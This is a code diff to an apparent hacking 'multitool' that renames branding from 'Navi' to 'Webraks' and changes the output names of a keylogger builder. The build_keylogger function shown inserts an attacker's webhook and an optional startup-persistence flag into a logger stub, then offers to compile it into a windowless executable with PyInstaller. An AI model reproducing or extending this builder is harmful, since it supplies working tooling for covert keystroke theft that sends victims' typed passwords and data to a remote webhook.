@@ -1,12 +1,5 @@
-#  _   _                 _ 
-# | \ | |               (_)
-# |  \| | __ ___   __ _  _ 
-# | . ` |/ _` \ \ / /(_)| |
-# | |\  | (_| |\ V /  _ | |
-# |_| \_|\__,_| \_/  (_)|_|
-# 
-# Navi Multitool - Developed by glockinhand
-# GitHub: https://github.com/glockinhand/webraks-multitool
+# Webraks Multitool - Developed by w3br4ks
+# GitHub: https://github.com/w3br4ks/webraks-multitool
 
 import os, json, re, subprocess
 from core.display import get_inpt, Colorate, Theme
@@ -30,7 +23,7 @@ def build_keylogger():
     stub = stub.replace("{{WEBHOOK}}", hook)
     stub = stub.replace("{{STARTUP}}", "True" if startup else "False")
     if not os.path.exists('output'): os.mkdir('output')
-    out_name = "Navi_Logger.py"
+    out_name = "Webraks_Logger.py"
     out_path = os.path.join('output', out_name)
     
     with open(out_path, 'w', encoding='utf-8') as f:
@@ -39,8 +32,8 @@ def build_keylogger():
     if get_inpt("compile to exe? (y/n):").lower() == 'y':
         print(Colorate.Horizontal(cl["num"], "  [!] Compiling with PyInstaller..."))
         try:
-            subprocess.run(f"pyinstaller --onefile --noconsole --distpath ./output --name Navi_Logger {out_path}", shell=True)
-            print(Colorate.Horizontal(cl["head"], "  [+] Compiled: output/Navi_Logger.exe"))
+            subprocess.run(f"pyinstaller --onefile --noconsole --distpath ./output --name Webraks_Logger {out_path}", shell=True)
+            print(Colorate.Horizontal(cl["head"], "  [+] Compiled: output/Webraks_Logger.exe"))
         except Exception as e:
             print(Colorate.Horizontal(cl["num"], f"  [!] Build Error: {e}"))
 
